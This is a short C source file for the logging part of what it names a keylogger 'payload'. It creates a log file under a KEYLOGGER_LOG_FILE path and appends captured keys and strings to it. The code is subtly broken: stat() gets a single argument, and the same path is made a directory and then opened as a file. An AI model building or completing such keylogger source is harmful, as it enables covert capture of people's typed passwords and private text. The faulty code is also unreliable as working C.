#include "payload.h"
#include "payload_config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

static FILE *log_file = NULL;
static int is_running = 0;

int payload_init() {
	if (is_running) {
		return 0;
	}

	// Create log file directory
	struct stat st = {0};
	if (stat(KEYLOGGER_LOG_FILE) == -1) {
		mkdir(KEYLOGGER_LOG_FILE, 0700);
	}

	// Open log file
	log_file = fopen(KEYLOGGER_LOG_FILE, "a");
	if (!log_file) {
		return -1;
	}

	is_running = 1;
	return 0;
}

void payload_cleanup() {
	if (!is_running) {
		return;
	}

	if (log_file) {
		fclose(log_file);
		log_file = NULL;
	}

	is_running = 0;
}

int payload_log_key(int key) {
	if (!is_running || !log_file) {
		return -1;
	}

	fprintf(log_file, "%c", key);
	fflush(log_file);
	return 0;
}

int payload_log_string(const char *str) {
	if (!is_running || !log_file || !str) {
		return -1;
	}

	fprintf(log_file, "%s", str);
	fflush(log_file);
	return 0;
}

const char *payload_get_version() {
	return PAYLOAD_VERSION;
}
